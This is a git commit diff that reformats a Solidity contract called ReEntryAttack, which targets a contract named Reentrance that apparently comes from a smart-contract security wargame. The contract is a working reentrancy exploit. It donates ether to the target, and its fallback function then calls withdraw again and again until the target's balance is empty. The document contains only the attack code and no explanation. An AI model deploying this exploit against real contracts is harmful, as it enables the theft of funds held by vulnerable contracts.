e068158b244323b852e96af9ad77b63ee5598984
Marc Nyiti <nyiti604@gmail.com>
2021-05-21 18:44:34 -0700

    Update ReEntryAttack.sol

--- ReEntryAttack.sol
+++ ReEntryAttack.sol
@@ -1,28 +1,25 @@
 pragma solidity ^0.6.0;
 
-import './Reentrance.sol';
+import "./Reentrance.sol";
 
 contract ReEntryAttack {
     
-    uint256 public amount = 1 ether;
     Reentrance target;
+    uint public amount = 1 ether;
     address private owner;
-    
     
     constructor(address payable _targetAddr) public payable {
         target = Reentrance(_targetAddr);
         owner = msg.sender;
     }
     
-    function donateToContract() public {
-        target.donate.value(amount)(address(this));
+    function makeDonation() public {
+        target.donate.value(amount).gas(4000000)(address(this));
     }
     
-    
     fallback() external payable {
-        if (address(target).balance != 0) {
+        if(address(target).balance != 0) {
             target.withdraw(amount);
         }
     }
-    
-}
+  }
